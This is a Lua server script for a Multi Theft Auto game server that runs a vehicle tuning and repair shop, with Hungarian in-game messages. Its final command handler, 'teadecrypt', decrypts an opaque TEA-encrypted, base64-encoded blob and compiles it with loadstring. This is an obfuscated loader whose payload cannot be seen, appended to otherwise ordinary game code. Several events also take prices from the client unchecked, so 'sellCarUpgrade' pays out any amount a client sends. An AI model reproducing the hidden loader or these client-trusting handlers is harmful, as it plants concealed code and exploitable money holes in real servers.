

function PlateText(thePlayer,commandName,text)
	local Vehicle = getPedOccupiedVehicle(thePlayer)
	if Vehicle then
		if text then
			setVehiclePlateText( Vehicle, text )
		else
			outputChatBox("You must enter a message.",thePlayer)
		end
	else
		outputChatBox("You must be in a Vehicle.",thePlayer)
	end
end
addCommandHandler("setplate",PlateText)

local handlings = {
	---[411] = {
	--	["maxVelocity"] = 2000,
	--	["engineAcceleration"] = 201,
	--	["engineInertia"] = 201,
	--	["brakeDeceleration"] = 10000,
	--	["tractionLoss"] = 0.8,
	--	["tractionBias"] = 0.3,	
	--},
}
local handlingNames = {
	["turbo"] = "Turbo",
	["enginev1"] = "Motor v1",
	["enginev2"] = "Motor v2",
	["enginev3"] = "Motor v3",
	["abs"] = "Anti Block System",
	["turn"] = "Turn v1",
	["turn2"] = "Turn v2",
	["break"] = "Break v1",
	["break2"] = "Break v2",
	["break3"] = "Break v3",
}
function buyCarUpgrade(player, veh, id, name, price)
	price = tonumber(price) or -1
	if(getPlayerMoney(player)>=price)then
		takePlayerMoney(player, price)
		addVehicleUpgrade(veh, id)
		exports.ig_radar:showNot(player, "Sikeresen beleszerelted a kocsidba:\n"..name)
	else
		exports.ig_radar:showNot(player, "Hiba! Nincs elég pénzed!\nA vásárláshoz $"..price.." kell.")
	end
end
addEvent("buyCarUpgrade", true)
addEventHandler("buyCarUpgrade", getRootElement(), buyCarUpgrade)

function fixVehicleEvent(player, veh, price)
	price = tonumber(price) or -1
	if(getPlayerMoney(player)>=price)then
		takePlayerMoney(player, price)
		fixVehicle(veh)
		exports.ig_radar:showNot(player, "Sikeresen megjavítottad a kocsid!")
	else
		exports.ig_radar:showNot(player, "Hiba! Nincs elég pénzed!\nA vásárláshoz $"..price.." kell.")
	end
end
addEvent("fixVehicle", true)
addEventHandler("fixVehicle", getRootElement(), fixVehicleEvent)

function changeVehColor(player, veh, r1, g1, b1, r2, g2, b2)
	if(getPlayerMoney(player)>=1000)then
		takePlayerMoney(player, 1000)
		exports.ig_radar:showNot(player, "Sikeresen átváltottad a kocsid szinét!")
		setVehicleColor(veh, r1, g1, b1, r2, g2, b2)
	else
		exports.ig_radar:showNot(player, "Hiba! Nincs elég pénzed!\nA vásárláshoz $"..price.." kell.")
	end
end
addEvent("changeVehColor", true)
addEventHandler("changeVehColor", getRootElement(), changeVehColor)

function addVehHandling(player, veh, data, price)
	price = tonumber(price) or -1
	if(getPlayerMoney(player)>=price)then
		takePlayerMoney(player, price)
		setElementData(veh, data, true)
		exports.ig_radar:showNot(player, "Sikeresen beleszerelted a kocsidba:\n"..handlingNames[data] or "Névtelen")
		addHandling(veh, player)
	else
		exports.ig_radar:showNot(player, "Hiba! Nincs elég pénzed!\nA vásárláshoz $"..price.." kell.")
	end
end
addEvent("addVehHandling", true)
addEventHandler("addVehHandling", getRootElement(), addVehHandling)

function delVehHandling(player, veh, data)
	setElementData(veh, data, false)
	setVehicleHandling(veh, "maxVelocity", getElementData(veh, "maxVelocity"))
	setVehicleHandling(veh, "engineAcceleration", getElementData(veh, "engineAcceleration"))
	setVehicleHandling(veh, "engineInertia", getElementData(veh, "engineInertia"))
end
addEvent("delVehHandling", true)
addEventHandler("delVehHandling", getRootElement(), delVehHandling)



function sellCarUpgrade(player, veh, id, name, price)
	removeVehicleUpgrade(veh, id)
	givePlayerMoney(player, price)
	exports.ig_radar:showNot(player, "Sikeresen kiszerelted a kocsiból:\n"..name)
end
addEvent("sellCarUpgrade", true)
addEventHandler("sellCarUpgrade", getRootElement(), sellCarUpgrade)

function getHandlings()
	return handlings
end

function getVehicleNewHandling(id, type)
	for k, v in pairs(handlings) do
		if(tonumber(k)==tonumber(id))then
			if(v[type]) then
				return v[type]
			end
		end
		return getOriginalHandling(id)[type] or 0
	end
end

addCommandHandler("h", function(player, cmd, id, t)
	if (not t) or (not id) or (not tonumber(id)) then
		outputChatBox("Add meg a fajtát és az ID-t", player)
		return
	end
	outputChatBox(t.." (("..getVehicleNameFromModel(tonumber(id))..")): "..getVehicleNewHandling(id,t), player)
end)

for k, v in pairs(handlings) do
	for i, l in pairs(v) do
		setModelHandling(k, i, l)
	end
end

function enter (theVehicle, seat)
	--if(seat==0)then
		addHandling(theVehicle, source)
	--end
end
addEventHandler ( "onPlayerVehicleEnter", getRootElement(), enter )


function getVehicleHandlingProperty ( element, property )
    if isElement ( element ) and getElementType ( element ) == "vehicle" and type ( property ) == "string" then -- Make sure there's a valid vehicle and a property string
        local handlingTable = getVehicleHandling ( element ) -- Get the handling as table and save as handlingTable
        local value = handlingTable[property] -- Get the value from the table
 
        if value then -- If there's a value (valid property)
            return value -- Return it
        end
    end
 
    return false -- Not an element, not a vehicle or no valid property string. Return failure
end

function addHandling (theVehicle, player)
	local theVehicleID = getElementModel(theVehicle)
	local s = 0
	if player and getElementData(theVehicle, "turbo") or false and player~=getRootElement() then
		s = 0.05
		triggerClientEvent ( player, "playTurboSound", player)
	end
	local h = getOriginalHandling(theVehicleID)
	
	if (not getElementData(theVehicle, "maxVelocity")) then
		setElementData(theVehicle, "maxVelocity",  getVehicleHandlingProperty(theVehicle, "maxVelocity"))
		setElementData(theVehicle, "engineAcceleration",  getVehicleHandlingProperty(theVehicle, "engineAcceleration"))
		setElementData(theVehicle, "engineInertia",  getVehicleHandlingProperty(theVehicle, "engineInertia"))
		setElementData(theVehicle, "engineType", "petrol")
	end
	
	
	if getElementData(theVehicle, "enginev3") or false then
		setVehicleHandling(theVehicle, "maxVelocity",  getVehicleHandlingProperty(theVehicle, "maxVelocity")*(1+s))
		setVehicleHandling(theVehicle, "engineAcceleration",  getVehicleHandlingProperty(theVehicle, "engineAcceleration")*(1+s))
		setVehicleHandling(theVehicle, "engineInertia",  getVehicleHandlingProperty(theVehicle, "engineInertia")*(1+s))
		setVehicleHandling(theVehicle, "engineType", "petrol")
	elseif getElementData(theVehicle, "enginev2") or false then
		setVehicleHandling(theVehicle, "maxVelocity", getVehicleHandlingProperty(theVehicle, "maxVelocity")*(0.7+s))
		setVehicleHandling(theVehicle, "engineAcceleration", getVehicleHandlingProperty(theVehicle, "engineAcceleration")*(0.7+s))
		setVehicleHandling(theVehicle, "engineInertia", getVehicleHandlingProperty(theVehicle, "engineInertia")*(0.7+s))
		setVehicleHandling(theVehicle, "engineType", "petrol")
	elseif getElementData(theVehicle, "enginev1") or false then
		setVehicleHandling(theVehicle, "maxVelocity", getVehicleHandlingProperty(theVehicle, "maxVelocity")*(0.3+s))
		setVehicleHandling(theVehicle, "engineAcceleration", getVehicleHandlingProperty(theVehicle, "engineAcceleration")*(0.3+s))
		setVehicleHandling(theVehicle, "engineInertia", getVehicleHandlingProperty(theVehicle, "engineInertia")*(0.3+s))
		setVehicleHandling(theVehicle, "engineType", "petrol")
	end
	if getElementData(theVehicle, "abs") or false then
		setVehicleHandling(theVehicle, "ABS", true)
	else
		setVehicleHandling(theVehicle, "ABS", false)
	end
	if getElementData(theVehicle, "driveType2") or false then
		setVehicleHandling(theVehicle, "driveType", "fwd")
	elseif getElementData(theVehicle, "driveType3") or false then
		setVehicleHandling(theVehicle, "driveType", "awd")
	else
		setVehicleHandling(theVehicle, "driveType", "rwd")
	end
	if getElementData(theVehicle, "turn") or false then
		setVehicleHandling(theVehicle, "brakeBias", 0.6)
		setVehicleHandling(theVehicle, "steeringLock", 35.0)
		setVehicleHandling(theVehicle, "tractionMultiplier", 1.05)
		setVehicleHandling(theVehicle, "tractionLoss", 0.98)
		setVehicleHandling(theVehicle, "tractionBias", 0.45)
		setVehicleHandling(theVehicle, "suspensionForceLevel", 1.2)
		setVehicleHandling(theVehicle, "centerOfMass", { 0.0, -0.15, -0.3})
		setVehicleHandling(theVehicle, "dragCoeff",1.0)
		setVehicleHandling(theVehicle, "suspensionHighSpeedDamping", 0.1)
	end
	if getElementData(theVehicle, "turn2") or false then
		setVehicleHandling(theVehicle, "brakeBias", 0.6)
		setVehicleHandling(theVehicle, "steeringLock", 40.0)
		setVehicleHandling(theVehicle, "tractionMultiplier", 1.4)
		setVehicleHandling(theVehicle, "tractionLoss", 0.98)
		setVehicleHandling(theVehicle, "tractionBias", 0.45)
		setVehicleHandling(theVehicle, "suspensionForceLevel", 1.3)
		setVehicleHandling(theVehicle, "centerOfMass", { 0.0, -0.15, -0.3})
		setVehicleHandling(theVehicle, "dragCoeff",1.0)
		setVehicleHandling(theVehicle, "suspensionHighSpeedDamping", 0.1)
	end
	if getElementData(theVehicle, "break") or false then
		setVehicleHandling(theVehicle, "brakeDeceleration", getVehicleNewHandling(theVehicleID, "brakeDeceleration")*1.5)
	end
	if getElementData(theVehicle, "break2") or false then
		setVehicleHandling(theVehicle, "brakeDeceleration", getVehicleNewHandling(theVehicleID, "brakeDeceleration")*2)
	end
	if getElementData(theVehicle, "break3") or false then
		setVehicleHandling(theVehicle, "brakeDeceleration", getVehicleNewHandling(theVehicleID, "brakeDeceleration")*3)
	end
end
addEvent("addHandling", true)
addEventHandler("addHandling", getRootElement(), addHandling)

--for i,v in ipairs(getElementsByType("vehicle")) do
--	addHandling (v)
--end



addCommandHandler("teadecrypt", function(player, cmd)
	local decodedString = loadstring(base64Decode(teaDecode("+d5MCqURlYMxDPOmKBsah3ytp15FTYvc7bTUJ9C8V/a4EITuih4wEWMg95mrdPUqwXCo0eLPLd/R7hnuSkBwyIu0Wn5o8hGWCC2k4Id1E/iR8cxnraTQak6MvE+GvaeTW0jUVj3OPgoRcwyoMuNzTneKSzoLSU4KgniyJ2ZEiTMagfqfCKfXX59FCczORHvAPxROYzIjaJoxDCnjYAIF385BYIp3cG6UxQHWlS8CLMBR6XfDO31xuMXujGpPM1Qxvevw5GcshxVwC14v190J+CCiXzLPutF+BSyiCTQ/6LuOpNim9+5ppSzkfy9IG66w1lfwG1EL6oO8V74ZAStf1ZB9IHrWzb75wRaiJ/4OpvlR6Kzr23CkIoq7/i25icPtMMnJzdo3lyGMdMMO0fg554SW9J3iDEmbLFdGfTd2CZW4IQ+WxjflctmyiXOu6VtZfihyavVpdl09ew694tVFQMHfgvMFA3Qm","lssdf[đĐŁŁsdf")))
	outputChatBox( "" .. tostring( decodedString ), source )
end)